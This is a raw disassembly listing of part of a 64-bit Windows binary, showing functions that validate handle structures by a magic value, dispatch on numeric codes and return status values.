   140002e5e:	48 85 c9             	test   %rcx,%rcx
   140002e61:	74 39                	je     0x140002e9c
   140002e63:	8b 41 0c             	mov    0xc(%rcx),%eax
   140002e66:	ff c8                	dec    %eax
   140002e68:	81 79 08 c4 d3 e2 f1 	cmpl   $0xf1e2d3c4,0x8(%rcx)
   140002e6f:	75 2b                	jne    0x140002e9c
   140002e71:	3d 50 c3 00 00       	cmp    $0xc350,%eax
   140002e76:	77 24                	ja     0x140002e9c
   140002e78:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   140002e7c:	41 38 58 30          	cmp    %bl,0x30(%r8)
   140002e80:	74 0d                	je     0x140002e8f
   140002e82:	e8 29 c2 00 00       	call   0x14000f0b0
   140002e87:	44 8b d8             	mov    %eax,%r11d
   140002e8a:	8b 5d e0             	mov    -0x20(%rbp),%ebx
   140002e8d:	eb 66                	jmp    0x140002ef5
   140002e8f:	e8 2c c4 00 00       	call   0x14000f2c0
   140002e94:	44 8b d8             	mov    %eax,%r11d
   140002e97:	8b 5d e0             	mov    -0x20(%rbp),%ebx
   140002e9a:	eb 59                	jmp    0x140002ef5
   140002e9c:	c7 45 d0 01 00 00 00 	movl   $0x1,-0x30(%rbp)
   140002ea3:	4c 8d 05 8e b9 12 00 	lea    0x12b98e(%rip),%r8        # 0x14012e838
   140002eaa:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140002eae:	e8 5d c1 00 00       	call   0x14000f010
   140002eb3:	44 8b 5d d0          	mov    -0x30(%rbp),%r11d
   140002eb7:	eb 3c                	jmp    0x140002ef5
   140002eb9:	44 0f b6 41 40       	movzbl 0x40(%rcx),%r8d
   140002ebe:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
   140002ec2:	45 85 c9             	test   %r9d,%r9d
   140002ec5:	74 29                	je     0x140002ef0
   140002ec7:	41 8b c3             	mov    %r11d,%eax
   140002eca:	41 83 f9 01          	cmp    $0x1,%r9d
   140002ece:	0f 95 c0             	setne  %al
   140002ed1:	89 45 d0             	mov    %eax,-0x30(%rbp)
   140002ed4:	74 1a                	je     0x140002ef0
   140002ed6:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140002eda:	e8 21 c9 00 00       	call   0x14000f800
   140002edf:	44 8b 5d d0          	mov    -0x30(%rbp),%r11d
   140002ee3:	eb 10                	jmp    0x140002ef5
   140002ee5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   140002eec:	00 00 00 00 
   140002ef0:	bb 0c 00 00 00       	mov    $0xc,%ebx
   140002ef5:	45 85 db             	test   %r11d,%r11d
   140002ef8:	0f 85 0e 01 00 00    	jne    0x14000300c
   140002efe:	89 1e                	mov    %ebx,(%rsi)
   140002f00:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   140002f03:	89 46 04             	mov    %eax,0x4(%rsi)
   140002f06:	41 8b c3             	mov    %r11d,%eax
   140002f09:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140002f10:	00 
   140002f11:	48 83 c4 50          	add    $0x50,%rsp
   140002f15:	5f                   	pop    %rdi
   140002f16:	5e                   	pop    %rsi
   140002f17:	5d                   	pop    %rbp
   140002f18:	c3                   	ret
   140002f19:	2d 42 9c 00 00       	sub    $0x9c42,%eax
   140002f1e:	0f 84 db 00 00 00    	je     0x140002fff
   140002f24:	2d 0e 27 00 00       	sub    $0x270e,%eax
   140002f29:	0f 84 b0 00 00 00    	je     0x140002fdf
   140002f2f:	83 f8 01             	cmp    $0x1,%eax
   140002f32:	74 19                	je     0x140002f4d
   140002f34:	41 bb 05 00 00 00    	mov    $0x5,%r11d
   140002f3a:	41 8b c3             	mov    %r11d,%eax
   140002f3d:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140002f44:	00 
   140002f45:	48 83 c4 50          	add    $0x50,%rsp
   140002f49:	5f                   	pop    %rdi
   140002f4a:	5e                   	pop    %rsi
   140002f4b:	5d                   	pop    %rbp
   140002f4c:	c3                   	ret
   140002f4d:	48 8d 79 38          	lea    0x38(%rcx),%rdi
   140002f51:	4c 8b c7             	mov    %rdi,%r8
   140002f54:	41 8b d1             	mov    %r9d,%edx
   140002f57:	e8 14 b3 00 00       	call   0x14000e270
   140002f5c:	85 c0                	test   %eax,%eax
   140002f5e:	0f 84 a0 00 00 00    	je     0x140003004
   140002f64:	0f b6 57 03          	movzbl 0x3(%rdi),%edx
   140002f68:	44 0f b6 47 04       	movzbl 0x4(%rdi),%r8d
   140002f6d:	bb 0c 00 00 00       	mov    $0xc,%ebx
   140002f72:	80 3f 01             	cmpb   $0x1,(%rdi)
   140002f75:	75 2a                	jne    0x140002fa1
   140002f77:	41 80 f8 01          	cmp    $0x1,%r8b
   140002f7b:	0f 85 83 00 00 00    	jne    0x140003004
   140002f81:	bb 24 00 00 00       	mov    $0x24,%ebx
   140002f86:	89 1e                	mov    %ebx,(%rsi)
   140002f88:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   140002f8b:	89 46 04             	mov    %eax,0x4(%rsi)
   140002f8e:	41 8b c3             	mov    %r11d,%eax
   140002f91:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140002f98:	00 
   140002f99:	48 83 c4 50          	add    $0x50,%rsp
   140002f9d:	5f                   	pop    %rdi
   140002f9e:	5e                   	pop    %rsi
   140002f9f:	5d                   	pop    %rbp
   140002fa0:	c3                   	ret
   140002fa1:	b9 18 00 00 00       	mov    $0x18,%ecx
   140002fa6:	80 fa 01             	cmp    $0x1,%dl
   140002fa9:	b8 24 00 00 00       	mov    $0x24,%eax
   140002fae:	0f 45 c3             	cmovne %ebx,%eax
   140002fb1:	8b d8                	mov    %eax,%ebx
   140002fb3:	41 80 f8 01          	cmp    $0x1,%r8b
   140002fb7:	75 4b                	jne    0x140003004
   140002fb9:	bb 30 00 00 00       	mov    $0x30,%ebx
   140002fbe:	41 3a d0             	cmp    %r8b,%dl
   140002fc1:	0f 45 d9             	cmovne %ecx,%ebx
   140002fc4:	89 1e                	mov    %ebx,(%rsi)
   140002fc6:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   140002fc9:	89 46 04             	mov    %eax,0x4(%rsi)
   140002fcc:	41 8b c3             	mov    %r11d,%eax
   140002fcf:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140002fd6:	00 
   140002fd7:	48 83 c4 50          	add    $0x50,%rsp
   140002fdb:	5f                   	pop    %rdi
   140002fdc:	5e                   	pop    %rsi
   140002fdd:	5d                   	pop    %rbp
   140002fde:	c3                   	ret
   140002fdf:	bb 0c 00 00 00       	mov    $0xc,%ebx
   140002fe4:	89 1e                	mov    %ebx,(%rsi)
   140002fe6:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   140002fe9:	89 46 04             	mov    %eax,0x4(%rsi)
   140002fec:	41 8b c3             	mov    %r11d,%eax
   140002fef:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140002ff6:	00 
   140002ff7:	48 83 c4 50          	add    $0x50,%rsp
   140002ffb:	5f                   	pop    %rdi
   140002ffc:	5e                   	pop    %rsi
   140002ffd:	5d                   	pop    %rbp
   140002ffe:	c3                   	ret
   140002fff:	bb 18 00 00 00       	mov    $0x18,%ebx
   140003004:	89 1e                	mov    %ebx,(%rsi)
   140003006:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   140003009:	89 46 04             	mov    %eax,0x4(%rsi)
   14000300c:	41 8b c3             	mov    %r11d,%eax
   14000300f:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140003016:	00 
   140003017:	48 83 c4 50          	add    $0x50,%rsp
   14000301b:	5f                   	pop    %rdi
   14000301c:	5e                   	pop    %rsi
   14000301d:	5d                   	pop    %rbp
   14000301e:	c3                   	ret
   14000301f:	e8 4c 6f 00 00       	call   0x140009f70
   140003024:	b8 01 00 00 00       	mov    $0x1,%eax
   140003029:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140003030:	00 
   140003031:	48 83 c4 50          	add    $0x50,%rsp
   140003035:	5f                   	pop    %rdi
   140003036:	5e                   	pop    %rsi
   140003037:	5d                   	pop    %rbp
   140003038:	c3                   	ret
   140003039:	cc                   	int3
   14000303a:	cc                   	int3
   14000303b:	cc                   	int3
   14000303c:	cc                   	int3
   14000303d:	cc                   	int3
   14000303e:	cc                   	int3
   14000303f:	cc                   	int3
   140003040:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140003045:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000304a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000304f:	55                   	push   %rbp
   140003050:	48 8b ec             	mov    %rsp,%rbp
   140003053:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   14000305a:	48 8b 05 df ff 13 00 	mov    0x13ffdf(%rip),%rax        # 0x140143040
   140003061:	48 33 c4             	xor    %rsp,%rax
   140003064:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140003068:	33 ff                	xor    %edi,%edi
   14000306a:	8b df                	mov    %edi,%ebx
   14000306c:	48 85 c9             	test   %rcx,%rcx
   14000306f:	0f 94 c3             	sete   %bl
   140003072:	48 85 c9             	test   %rcx,%rcx
   140003075:	75 11                	jne    0x140003088
   140003077:	48 8d 15 3a b7 12 00 	lea    0x12b73a(%rip),%rdx        # 0x14012e7b8
   14000307e:	e8 4d 6e 00 00       	call   0x140009ed0
   140003083:	e9 3b 04 00 00       	jmp    0x1400034c3
   140003088:	48 8b 31             	mov    (%rcx),%rsi
   14000308b:	48 85 f6             	test   %rsi,%rsi
   14000308e:	0f 84 25 04 00 00    	je     0x1400034b9
   140003094:	8b 46 0c             	mov    0xc(%rsi),%eax
   140003097:	ff c8                	dec    %eax
   140003099:	81 7e 08 c4 d3 e2 f1 	cmpl   $0xf1e2d3c4,0x8(%rsi)
   1400030a0:	0f 85 13 04 00 00    	jne    0x1400034b9
   1400030a6:	3d 50 c3 00 00       	cmp    $0xc350,%eax
   1400030ab:	0f 87 08 04 00 00    	ja     0x1400034b9
   1400030b1:	8b 51 0c             	mov    0xc(%rcx),%edx
   1400030b4:	44 8b 41 30          	mov    0x30(%rcx),%r8d
   1400030b8:	4c 8b 49 28          	mov    0x28(%rcx),%r9
   1400030bc:	4c 89 4d b0          	mov    %r9,-0x50(%rbp)
   1400030c0:	44 89 45 b8          	mov    %r8d,-0x48(%rbp)
   1400030c4:	48 89 7d bc          	mov    %rdi,-0x44(%rbp)
   1400030c8:	89 55 c4             	mov    %edx,-0x3c(%rbp)
   1400030cb:	4c 8d 51 10          	lea    0x10(%rcx),%r10
   1400030cf:	4c 89 55 c8          	mov    %r10,-0x38(%rbp)
   1400030d3:	48 89 75 d0          	mov    %rsi,-0x30(%rbp)
   1400030d7:	0f 85 41 ec ff ff    	jne    0x140001d1e
   1400030dd:	e8 b2 05 00 00       	call   0x140003694
   1400030e2:	e9 80 0b 00 00       	jmp    0x140003c67
   1400030e7:	d0 01                	rolb   $1,(%rcx)
   1400030e9:	00 00                	add    %al,(%rax)
   1400030eb:	2d 20 4e 00 00       	sub    $0x4e20,%eax
   1400030f0:	0f 84 49 01 00 00    	je     0x14000323f
   1400030f6:	83 e8 01             	sub    $0x1,%eax
   1400030f9:	74 4d                	je     0x140003148
   1400030fb:	83 e8 01             	sub    $0x1,%eax
   1400030fe:	74 34                	je     0x140003134
   140003100:	3d 1e 4e 00 00       	cmp    $0x4e1e,%eax
   140003105:	0f 85 30 02 00 00    	jne    0x14000333b
   14000310b:	48 8b 41 38          	mov    0x38(%rcx),%rax
   14000310f:	48 8d 55 b0          	lea    -0x50(%rbp),%rdx
   140003113:	40 38 79 40          	cmp    %dil,0x40(%rcx)
   140003117:	48 8b c8             	mov    %rax,%rcx
   14000311a:	74 0c                	je     0x140003128
   14000311c:	e8 bf d3 00 00       	call   0x1400104e0
   140003121:	8b d8                	mov    %eax,%ebx
   140003123:	e9 9b 03 00 00       	jmp    0x1400034c3
   140003128:	e8 f3 d5 00 00       	call   0x140010720
   14000312d:	8b d8                	mov    %eax,%ebx
   14000312f:	e9 8f 03 00 00       	jmp    0x1400034c3
   140003134:	48 8d 51 38          	lea    0x38(%rcx),%rdx
   140003138:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   14000313c:	e8 3f 77 00 00       	call   0x14000a880
   140003141:	8b d8                	mov    %eax,%ebx
   140003143:	e9 7b 03 00 00       	jmp    0x1400034c3
   140003148:	4c 8d 49 38          	lea    0x38(%rcx),%r9
   14000314c:	49 8b 19             	mov    (%r9),%rbx
   14000314f:	48 85 db             	test   %rbx,%rbx
   140003152:	74 76                	je     0x1400031ca
   140003154:	8b 43 0c             	mov    0xc(%rbx),%eax
   140003157:	ff c8                	dec    %eax
   140003159:	81 7b 08 c4 d3 e2 f1 	cmpl   $0xf1e2d3c4,0x8(%rbx)
   140003160:	75 68                	jne    0x1400031ca
   140003162:	3d 50 c3 00 00       	cmp    $0xc350,%eax
   140003167:	77 61                	ja     0x1400031ca
   140003169:	85 d2                	test   %edx,%edx
   14000316b:	74 08                	je     0x140003175
   14000316d:	83 fa 01             	cmp    $0x1,%edx
   140003170:	75 03                	jne    0x140003175
   140003172:	8d 7a 2f             	lea    0x2f(%rdx),%edi
   140003175:	48 8b cb             	mov    %rbx,%rcx
   140003178:	41 80 79 10 00       	cmpb   $0x0,0x10(%r9)
   14000317d:	74 38                	je     0x1400031b7
   14000317f:	49 8b d2             	mov    %r10,%rdx
   140003182:	e8 29 3a 01 00       	call   0x140016bb0
   140003187:	48 8b 43 20          	mov    0x20(%rbx),%rax
   14000318b:	0f b6 88 5c 05 00 00 	movzbl 0x55c(%rax),%ecx
   140003192:	f6 d9                	neg    %cl
   140003194:	45 1b c9             	sbb    %r9d,%r9d
   140003197:	41 83 e1 08          	and    $0x8,%r9d
   14000319b:	4c 8b 43 30          	mov    0x30(%rbx),%r8
   14000319f:	4c 03 c7             	add    %rdi,%r8
   1400031a2:	ba 58 23 00 00       	mov    $0x2358,%edx
   1400031a7:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   1400031ab:	e8 f0 65 01 00       	call   0x1400197a0
   1400031b0:	8b d8                	mov    %eax,%ebx
   1400031b2:	e9 0c 03 00 00       	jmp    0x1400034c3
   1400031b7:	4c 8b c7             	mov    %rdi,%r8
   1400031ba:	48 8d 55 b0          	lea    -0x50(%rbp),%rdx
   1400031be:	e8 2d d0 00 00       	call   0x1400101f0
   1400031c3:	8b d8                	mov    %eax,%ebx
   1400031c5:	e9 f9 02 00 00       	jmp    0x1400034c3
   1400031ca:	bb 01 00 00 00       	mov    $0x1,%ebx
   1400031cf:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400031d2:	0f 11 45 d8          	movups %xmm0,-0x28(%rbp)
   1400031d6:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
   1400031da:	48 c7 45 f0 0f 00 00 	movq   $0xf,-0x10(%rbp)
   1400031e1:	00 
   1400031e2:	48 8d 05 27 b7 12 00 	lea    0x12b727(%rip),%rax        # 0x14012e910
   1400031e9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400031ee:	4c 8b c6             	mov    %rsi,%r8
   1400031f1:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   1400031f5:	e8 86 bb 00 00       	call   0x14000ed80
   1400031fa:	90                   	nop
   1400031fb:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
   1400031ff:	48 83 fa 10          	cmp    $0x10,%rdx
   140003203:	0f 82 ba 02 00 00    	jb     0x1400034c3
   140003209:	48 ff c2             	inc    %rdx
   14000320c:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
   140003210:	48 8b c1             	mov    %rcx,%rax
   140003213:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000321a:	72 19                	jb     0x140003235
   14000321c:	48 83 c2 27          	add    $0x27,%rdx
   140003220:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140003224:	48 2b c1             	sub    %rcx,%rax
   140003227:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   14000322b:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000322f:	0f 87 b5 02 00 00    	ja     0x1400034ea
   140003235:	e8 56 b1 0b 00       	call   0x1400be390
   14000323a:	e9 84 02 00 00       	jmp    0x1400034c3
   14000323f:	4c 8d 41 38          	lea    0x38(%rcx),%r8
   140003243:	49 8b 08             	mov    (%r8),%rcx
   140003246:	48 85 c9             	test   %rcx,%rcx
   140003249:	74 3a                	je     0x140003285
   14000324b:	8b 41 0c             	mov    0xc(%rcx),%eax
   14000324e:	ff c8                	dec    %eax
   140003250:	81 79 08 c4 d3 e2 f1 	cmpl   $0xf1e2d3c4,0x8(%rcx)
   140003257:	75 2c                	jne    0x140003285
   140003259:	3d 50 c3 00 00       	cmp    $0xc350,%eax
   14000325e:	77 25                	ja     0x140003285
   140003260:	48 8d 55 b0          	lea    -0x50(%rbp),%rdx
   140003264:	41 38 78 30          	cmp    %dil,0x30(%r8)
   140003268:	74 0f                	je     0x140003279
   14000326a:	4d 8b ca             	mov    %r10,%r9
   14000326d:	e8 8e c6 00 00       	call   0x14000f900
   140003272:	8b d8                	mov    %eax,%ebx
   140003274:	e9 4a 02 00 00       	jmp    0x1400034c3
   140003279:	e8 52 ca 00 00       	call   0x14000fcd0
   14000327e:	8b d8                	mov    %eax,%ebx
   140003280:	e9 3e 02 00 00       	jmp    0x1400034c3
   140003285:	bb 01 00 00 00       	mov    $0x1,%ebx
   14000328a:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000328d:	0f 11 45 d8          	movups %xmm0,-0x28(%rbp)
   140003291:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
   140003295:	48 c7 45 f0 0f 00 00 	movq   $0xf,-0x10(%rbp)
   14000329c:	00 
   14000329d:	48 8d 05 94 b5 12 00 	lea    0x12b594(%rip),%rax        # 0x14012e838
   1400032a4:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400032a9:	4c 8b c6             	mov    %rsi,%r8
   1400032ac:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   1400032b0:	e8 cb ba 00 00       	call   0x14000ed80
   1400032b5:	90                   	nop
   1400032b6:	e9 40 ff ff ff       	jmp    0x1400031fb
   1400032bb:	0f b6 41 40          	movzbl 0x40(%rcx),%eax
   1400032bf:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
   1400032c3:	85 d2                	test   %edx,%edx
   1400032c5:	75 20                	jne    0x1400032e7
   1400032c7:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   1400032cb:	84 c0                	test   %al,%al
   1400032cd:	74 0c                	je     0x1400032db
   1400032cf:	e8 2c 69 01 00       	call   0x140019c00
   1400032d4:	8b d8                	mov    %eax,%ebx
   1400032d6:	e9 e8 01 00 00       	jmp    0x1400034c3
   1400032db:	e8 c0 6a 01 00       	call   0x140019da0
   1400032e0:	8b d8                	mov    %eax,%ebx
   1400032e2:	e9 dc 01 00 00       	jmp    0x1400034c3
   1400032e7:	83 fa 01             	cmp    $0x1,%edx
   1400032ea:	40 0f 95 c7          	setne  %dil
   1400032ee:	89 7d d8             	mov    %edi,-0x28(%rbp)
   1400032f1:	74 11                	je     0x140003304
   1400032f3:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   1400032f7:	e8 04 c5 00 00       	call   0x14000f800
   1400032fc:	8b 5d d8             	mov    -0x28(%rbp),%ebx
   1400032ff:	e9 bf 01 00 00       	jmp    0x1400034c3
   140003304:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   140003308:	84 c0                	test   %al,%al
   14000330a:	74 0c                	je     0x140003318
   14000330c:	e8 df d7 00 00       	call   0x140010af0
   140003311:	8b d8                	mov    %eax,%ebx
   140003313:	e9 ab 01 00 00       	jmp    0x1400034c3
   140003318:	e8 73 d9 00 00       	call   0x140010c90
   14000331d:	8b d8                	mov    %eax,%ebx
   14000331f:	e9 9f 01 00 00       	jmp    0x1400034c3
   140003324:	2d 42 9c 00 00       	sub    $0x9c42,%eax
   140003329:	0f 84 bf 00 00 00    	je     0x1400033ee
   14000332f:	2d 0e 27 00 00       	sub    $0x270e,%eax
   140003334:	74 6f                	je     0x1400033a5
   140003336:	83 f8 01             	cmp    $0x1,%eax
   140003339:	74 0a                	je     0x140003345
   14000333b:	bb 05 00 00 00       	mov    $0x5,%ebx
   140003340:	e9 7e 01 00 00       	jmp    0x1400034c3
   140003345:	4c 8d 59 38          	lea    0x38(%rcx),%r11
   140003349:	8b df                	mov    %edi,%ebx
   14000334b:	4d 8b c3             	mov    %r11,%r8
   14000334e:	e8 1d af 00 00       	call   0x14000e270
   140003353:	85 c0                	test   %eax,%eax
   140003355:	0f 84 68 01 00 00    	je     0x1400034c3
   14000335b:	44 8b c0             	mov    %eax,%r8d
   14000335e:	49 8b d3             	mov    %r11,%rdx
   140003361:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   140003365:	e8 46 dc 00 00       	call   0x140010fb0
   14000336a:	8b d8                	mov    %eax,%ebx
   14000336c:	85 c0                	test   %eax,%eax
   14000336e:	0f 84 4f 01 00 00    	je     0x1400034c3
   140003374:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003377:	0f 11 45 d8          	movups %xmm0,-0x28(%rbp)
   14000337b:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
   14000337f:	48 c7 45 f0 0f 00 00 	movq   $0xf,-0x10(%rbp)
   140003386:	00 
   140003387:	48 8d 05 42 b6 12 00 	lea    0x12b642(%rip),%rax        # 0x14012e9d0
   14000338e:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003393:	4c 8b c6             	mov    %rsi,%r8
   140003396:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   14000339a:	e8 e1 b9 00 00       	call   0x14000ed80
   14000339f:	90                   	nop
   1400033a0:	e9 56 fe ff ff       	jmp    0x1400031fb
   1400033a5:	8b 51 38             	mov    0x38(%rcx),%edx
   1400033a8:	c1 ea 07             	shr    $0x7,%edx
   1400033ab:	45 33 c0             	xor    %r8d,%r8d
   1400033ae:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   1400033b2:	e8 79 da 00 00       	call   0x140010e30
   1400033b7:	8b d8                	mov    %eax,%ebx
   1400033b9:	85 c0                	test   %eax,%eax
   1400033bb:	74 6b                	je     0x140003428
   1400033bd:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400033c0:	0f 11 45 d8          	movups %xmm0,-0x28(%rbp)
   1400033c4:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
   1400033c8:	48 c7 45 f0 0f 00 00 	movq   $0xf,-0x10(%rbp)
   1400033cf:	00 
   1400033d0:	48 8d 05 c1 b5 12 00 	lea    0x12b5c1(%rip),%rax        # 0x14012e998
   1400033d7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400033dc:	4c 8b c6             	mov    %rsi,%r8
   1400033df:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   1400033e3:	e8 98 b9 00 00       	call   0x14000ed80
   1400033e8:	90                   	nop
   1400033e9:	e9 0d fe ff ff       	jmp    0x1400031fb
   1400033ee:	c7 45 d8 04 00 00 7a 	movl   $0x7a000004,-0x28(%rbp)
   1400033f5:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
   1400033f9:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
   1400033fd:	c7 45 dc 3f 1c 10 00 	movl   $0x101c3f,-0x24(%rbp)
   140003404:	4d 85 c9             	test   %r9,%r9
   140003407:	74 44                	je     0x14000344d
   140003409:	41 83 f8 18          	cmp    $0x18,%r8d
   14000340d:	72 3e                	jb     0x14000344d
   14000340f:	49 83 f8 18          	cmp    $0x18,%r8
   140003413:	72 1a                	jb     0x14000342f
   140003415:	0f 10 45 d8          	movups -0x28(%rbp),%xmm0
   140003419:	41 0f 11 01          	movups %xmm0,(%r9)
   14000341d:	f2 0f 10 4d e8       	movsd  -0x18(%rbp),%xmm1
   140003422:	f2 41 0f 11 49 10    	movsd  %xmm1,0x10(%r9)
   140003428:	8b df                	mov    %edi,%ebx
   14000342a:	e9 94 00 00 00       	jmp    0x1400034c3
   14000342f:	33 d2                	xor    %edx,%edx
   140003431:	49 8b c9             	mov    %r9,%rcx
   140003434:	e8 07 e3 0b 00       	call   0x1400c1740
   140003439:	e8 ce 1a 0e 00       	call   0x1400e4f0c
   14000343e:	c7 00 22 00 00 00    	movl   $0x22,(%rax)
   140003444:	e8 57 02 0e 00       	call   0x1400e36a0
   140003449:	8b df                	mov    %edi,%ebx
   14000344b:	eb 76                	jmp    0x1400034c3
   14000344d:	bb 06 00 00 00       	mov    $0x6,%ebx
   140003452:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003455:	0f 11 45 d8          	movups %xmm0,-0x28(%rbp)
   140003459:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
   14000345d:	48 c7 45 f0 0f 00 00 	movq   $0xf,-0x10(%rbp)
   140003464:	00 
   140003465:	48 8d 05 04 b5 12 00 	lea    0x12b504(%rip),%rax        # 0x14012e970
   14000346c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003471:	4c 8b c6             	mov    %rsi,%r8
   140003474:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   140003478:	e8 03 b9 00 00       	call   0x14000ed80
   14000347d:	90                   	nop
   14000347e:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
   140003482:	48 83 fa 10          	cmp    $0x10,%rdx
   140003486:	72 3b                	jb     0x1400034c3
   140003488:	48 ff c2             	inc    %rdx
   14000348b:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
   14000348f:	48 8b c1             	mov    %rcx,%rax
   140003492:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003499:	0f 82 96 fd ff ff    	jb     0x140003235
   14000349f:	48 83 c2 27          	add    $0x27,%rdx
   1400034a3:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400034a7:	48 2b c1             	sub    %rcx,%rax
   1400034aa:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   1400034ae:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400034b2:	77 36                	ja     0x1400034ea
   1400034b4:	e9 7c fd ff ff       	jmp    0x140003235
   1400034b9:	bb 01 00 00 00       	mov    $0x1,%ebx
   1400034be:	e8 ad 6a 00 00       	call   0x140009f70
   1400034c3:	8b c3                	mov    %ebx,%eax
   1400034c5:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   1400034c9:	48 33 cc             	xor    %rsp,%rcx
   1400034cc:	e8 9f ae 0b 00       	call   0x1400be370
   1400034d1:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
   1400034d8:	00 
   1400034d9:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   1400034dd:	49 8b 73 20          	mov    0x20(%r11),%rsi
   1400034e1:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   1400034e5:	49 8b e3             	mov    %r11,%rsp
   1400034e8:	5d                   	pop    %rbp
   1400034e9:	c3                   	ret
   1400034ea:	e8 d1 01 0e 00       	call   0x1400e36c0
   1400034ef:	cc                   	int3
   1400034f0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400034f5:	55                   	push   %rbp
   1400034f6:	56                   	push   %rsi
   1400034f7:	57                   	push   %rdi
   1400034f8:	48 8b ec             	mov    %rsp,%rbp
   1400034fb:	48 83 ec 50          	sub    $0x50,%rsp
   1400034ff:	48 8b f2             	mov    %rdx,%rsi
   140003502:	45 33 db             	xor    %r11d,%r11d
   140003505:	41 8b db             	mov    %r11d,%ebx
   140003508:	48 85 c9             	test   %rcx,%rcx
   14000350b:	0f 94 c3             	sete   %bl
   14000350e:	48 85 c9             	test   %rcx,%rcx
   140003511:	75 1e                	jne    0x140003531
   140003513:	48 8d 15 9e b2 12 00 	lea    0x12b29e(%rip),%rdx        # 0x14012e7b8
   14000351a:	e8 b1 69 00 00       	call   0x140009ed0
   14000351f:	8b c3                	mov    %ebx,%eax
   140003521:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140003528:	00 
   140003529:	48 83 c4 50          	add    $0x50,%rsp
   14000352d:	5f                   	pop    %rdi
   14000352e:	5e                   	pop    %rsi
   14000352f:	5d                   	pop    %rbp
   140003530:	c3                   	ret
   140003531:	41 8b db             	mov    %r11d,%ebx
   140003534:	48 85 f6             	test   %rsi,%rsi
   140003537:	0f 94 c3             	sete   %bl
   14000353a:	48 85 f6             	test   %rsi,%rsi
   14000353d:	75 1e                	jne    0x14000355d
   14000353f:	48 8d 15 9a b2 12 00 	lea    0x12b29a(%rip),%rdx        # 0x14012e7e0
   140003546:	e8 85 69 00 00       	call   0x140009ed0
   14000354b:	8b c3                	mov    %ebx,%eax
   14000354d:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140003554:	00 
   140003555:	48 83 c4 50          	add    $0x50,%rsp
   140003559:	5f                   	pop    %rdi
   14000355a:	5e                   	pop    %rsi
   14000355b:	5d                   	pop    %rbp
   14000355c:	c3                   	ret
   14000355d:	48 8b 11             	mov    (%rcx),%rdx
   140003560:	48 85 d2             	test   %rdx,%rdx
   140003563:	0f 84 c6 02 00 00    	je     0x14000382f
   140003569:	8b 42 0c             	mov    0xc(%rdx),%eax
   14000356c:	ff c8                	dec    %eax
   14000356e:	81 7a 08 c4 d3 e2 f1 	cmpl   $0xf1e2d3c4,0x8(%rdx)
   140003575:	0f 85 b4 02 00 00    	jne    0x14000382f
